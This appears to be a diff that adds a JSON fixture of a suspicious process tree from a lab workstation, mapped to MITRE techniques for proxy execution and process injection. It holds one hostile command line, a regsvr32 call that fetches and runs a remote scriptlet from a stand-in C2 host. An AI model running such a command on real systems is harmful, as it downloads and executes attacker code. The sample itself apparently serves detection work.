@@ -1,0 +1,26 @@
+{
+  "host": "WKST-LAB-090",
+  "collected_utc": "2024-10-19T01:13:02Z",
+  "root": {
+    "pid": 7200,
+    "name": "svchost.exe",
+    "user": "NT AUTHORITY\\NETWORK SERVICE",
+    "children": [
+      {
+        "pid": 7310,
+        "name": "regsvr32.exe",
+        "command_line": "regsvr32.exe /s /u /i:http://malware-c2.example/s.sct scrobj.dll",
+        "children": [
+          {
+            "pid": 7322,
+            "name": "dllhost.exe",
+            "command_line": "C:\\Windows\\System32\\dllhost.exe /Processid {LAB-GUID}",
+            "suspicious_injection_target": true,
+            "children": []
+          }
+        ]
+      }
+    ]
+  },
+  "mitre": ["T1055", "T1218.010"]
+}
